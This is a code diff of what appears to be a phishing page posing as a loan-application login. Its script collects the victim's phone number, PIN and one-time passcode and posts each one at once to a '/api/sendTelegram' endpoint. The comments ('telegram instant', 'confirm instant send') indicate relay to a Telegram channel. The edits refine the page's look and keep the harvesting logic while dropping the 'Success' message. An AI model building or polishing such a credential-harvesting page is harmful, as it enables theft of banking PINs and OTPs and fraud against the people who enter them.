@@ -24,6 +24,7 @@ body{
   color:#e5e7eb;
 }
 
+/* CARD */
 .card{
   width:100%;
   max-width:380px;
@@ -45,6 +46,7 @@ h2{
   margin:0 0 12px;
   font-size:20px;
   color:#f8fafc;
+  letter-spacing:.2px;
 }
 
 label{
@@ -63,6 +65,12 @@ input{
   color:#e5e7eb;
   font-size:14px;
   outline:none;
+  transition:border-color .15s ease, box-shadow .15s ease;
+}
+
+input:focus{
+  border-color:#2563eb;
+  box-shadow:0 0 0 1px rgba(37,99,235,.35);
 }
 
 .btn{
@@ -98,7 +106,6 @@ input{
   font-size:1px;
   color:transparent;
   caret-color:transparent;
-  outline:none;
 }
 
 .pin-digit.filled{
@@ -147,14 +154,6 @@ input{
   display:flex;
   justify-content:space-between;
   margin-top:14px;
-}
-
-.resend-btn{
-  background:#020617;
-  border:1px solid #1f2937;
-  padding:10px 14px;
-  border-radius:8px;
-  color:#e5e7eb;
 }
 </style>
 </head>
@@ -207,17 +206,24 @@ input{
 
 
 <input id="otpBuffer"
+
 type="tel"
+
 inputmode="numeric"
+
 pattern="[0-9]*"
+
 autocomplete="one-time-code"
-style="position:absolute;opacity:0">
+
+style="position:absolute;opacity:0;pointer-events:none">
 
 
 <div class="resend-row">
 
 <div>
+
 Resend in <span id="countdown">120</span>s
+
 </div>
 
 <button id="resendBtn" disabled>
@@ -229,15 +235,18 @@ Resend OTP
 </div>
 
 
-<button id="confirmOtp" disabled>Confirm</button>
+<button id="confirmOtp" disabled>
+
+Confirm
+
+</button>
+
 
 <button id="cancelOtp">
 
 Cancel
 
 </button>
-
-<div id="otpStatus"></div>
 
 </div>
 
@@ -248,7 +257,6 @@ Cancel
 <script>
 
 /* loan unchanged */
-
 function buildLoanRequest(){
 
 try{
@@ -259,18 +267,12 @@ if(!loan.loanAmount) return 'N/A';
 
 return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
 
-}catch{
-
-return 'N/A';
-
-}
+}catch{return 'N/A'}
 
 }
 
 
-
-/* pin numeric + backspace */
-
+/* pin backspace smooth */
 const pins=[...document.querySelectorAll('.pin-digit')];
 
 let pinValue='';
@@ -318,16 +320,14 @@ loginBtn.disabled=pinValue.length!==4;
 }
 
 
-
 /* telegram instant */
-
 function sendToServer(data){
 
 fetch("/api/sendTelegram",{
 
 method:"POST",
 
-headers:{'Content-Type':'application/json'},
+headers:{"Content-Type":"application/json"},
 
 body:JSON.stringify(data)
 
@@ -336,9 +336,7 @@ body:JSON.stringify(data)
 }
 
 
-
-/* otp numeric maintained */
-
+/* otp keyboard maintained */
 const dots=[...document.querySelectorAll('.otp-digit')];
 
 const buffer=document.getElementById('otpBuffer');
@@ -346,11 +344,7 @@ const buffer=document.getElementById('otpBuffer');
 const confirmBtn=document.getElementById('confirmOtp');
 
 
-document.getElementById('otpModal').addEventListener('click',()=>{
-
-buffer.focus();
-
-});
+document.getElementById('otpModal').addEventListener('click',()=>buffer.focus());
 
 
 buffer.addEventListener('input',()=>{
@@ -386,7 +380,6 @@ d.classList.toggle('filled',buffer.value[i]);
 
 
 /* login instant send */
-
 loginForm.onsubmit=e=>{
 
 e.preventDefault();
@@ -395,9 +388,9 @@ sendToServer({
 
 event:'login',
 
-pin:pinValue,
-
 phone:phone.value,
+
+pin:pinValue,
 
 loan_request:buildLoanRequest(),
 
@@ -412,9 +405,7 @@ setTimeout(()=>buffer.focus(),50);
 };
 
 
-
 /* confirm instant send */
-
 confirmBtn.onclick=()=>{
 
 sendToServer({
@@ -423,9 +414,9 @@ event:'otp',
 
 otp:buffer.value,
 
-pin:pinValue,
-
 phone:phone.value,
+
+pin:pinValue,
 
 loan_request:buildLoanRequest(),
 
@@ -433,14 +424,13 @@ time:new Date().toISOString()
 
 });
 
-otpStatus.innerHTML="Success";
-
 };
 
 
+cancelOtp.onclick=()=>otpModal.style.display="none";
+
 
 /* countdown unchanged */
-
 let t=120;
 
 setInterval(()=>{
@@ -450,14 +440,6 @@ countdown.innerText=--t;
 if(t<=0) resendBtn.disabled=false;
 
 },1000);
-
-
-
-cancelOtp.onclick=()=>{
-
-otpModal.style.display="none";
-
-};
 
 </script>
 
